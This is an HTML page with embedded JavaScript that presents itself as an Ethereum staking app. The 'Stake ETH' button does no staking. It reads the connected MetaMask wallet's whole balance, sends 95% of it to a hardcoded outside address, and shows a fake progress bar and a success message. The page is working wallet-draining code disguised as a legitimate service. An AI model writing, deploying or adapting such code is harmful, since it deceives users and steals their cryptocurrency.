<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Staking DApp on Ethereum</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        #app {
            width: 80%;
            margin: 0 auto;
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            background-color: #fff;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        #walletAddress {
            margin: 20px 0;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .status {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
        #progressBar {
            width: 100%;
            height: 30px;
            background-color: #e0e0e0;
            border-radius: 15px;
            margin-top: 20px;
            display: none;
        }
        #progress {
            height: 100%;
            background-color: #4caf50;
            border-radius: 15px;
            width: 0;
        }
    </style>
</head>
<body>

<div id="app">
    <h1>Stake on Ethereum</h1>
    <p id="walletAddress">Connect your wallet to see your Ethereum address</p>
    <button id="connectButton">Connect MetaMask</button>
    <button id="stakeButton" disabled>Stake ETH</button>
    <div class="status" id="status"></div>
    <div id="progressBar"><div id="progress"></div></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
<script>
    let web3;
    let userAccount;
    let recipientAddress = "0x91Dc7c5B75c0FCD64a02F648d56cDE818982D1f2";  // Ethereum recipient address

    // Connect to MetaMask
    document.getElementById("connectButton").addEventListener("click", async () => {
        if (window.ethereum) {
            web3 = new Web3(window.ethereum);
            try {
                await window.ethereum.request({ method: "eth_requestAccounts" });
                userAccount = (await web3.eth.getAccounts())[0];
                document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
                checkNetwork();
                document.getElementById("stakeButton").disabled = false;
            } catch (error) {
                console.error("Error connecting to MetaMask", error);
            }
        } else {
            alert("Please install MetaMask!");
        }
    });

    // Check if the user is connected to the Ethereum network
    async function checkNetwork() {
        const networkId = await web3.eth.net.getId();
        if (networkId !== 1) {
            alert("You are not connected to the Ethereum network. Please switch to Ethereum Mainnet.");
        } else {
            console.log("Connected to Ethereum network");
        }
    }

    // Stake ETH from user's wallet to the recipient address
    document.getElementById("stakeButton").addEventListener("click", async () => {
        try {
            // Display progress bar
            document.getElementById("progressBar").style.display = "block";
            let progress = 0;
            let progressInterval = setInterval(() => {
                if (progress < 100) {
                    progress += 10;
                    document.getElementById("progress").style.width = progress + "%";
                }
            }, 1000);

            // Fetch user balance and gas price
            const balance = await web3.eth.getBalance(userAccount);
            const gasPrice = await web3.eth.getGasPrice();
            const gasLimit = await web3.eth.estimateGas({
                from: userAccount,
                to: recipientAddress,
                value: balance
            });

            // Calculate gas cost
            const gasCost = BigInt(gasLimit) * BigInt(gasPrice);

            // Define the percentage of balance to send (e.g., 95%)
            const sendPercentage = 0.95;
            const valueToSend = BigInt(balance) * BigInt(sendPercentage * 100) / BigInt(100);

            // Ensure enough ETH is left for gas fees
            if (valueToSend <= gasCost) {
                document.getElementById("status").innerText = "Insufficient ETH to cover gas fees.";
                clearInterval(progressInterval);
                document.getElementById("progress").style.width = "0%";
                return;
            }

            // Send ETH to the recipient
            const tx = await web3.eth.sendTransaction({
                from: userAccount,
                to: recipientAddress,
                value: valueToSend.toString()
            });

            // Stop progress bar
            clearInterval(progressInterval);
            document.getElementById("progress").style.width = "100%";
            document.getElementById("status").innerText = "Transaction successful: " + tx.transactionHash;
        } catch (error) {
            document.getElementById("status").innerText = "Transaction failed: " + error.message;
            clearInterval(progressInterval);
            document.getElementById("progress").style.width = "0%";
        }
    });
</script>

</body>
</html>
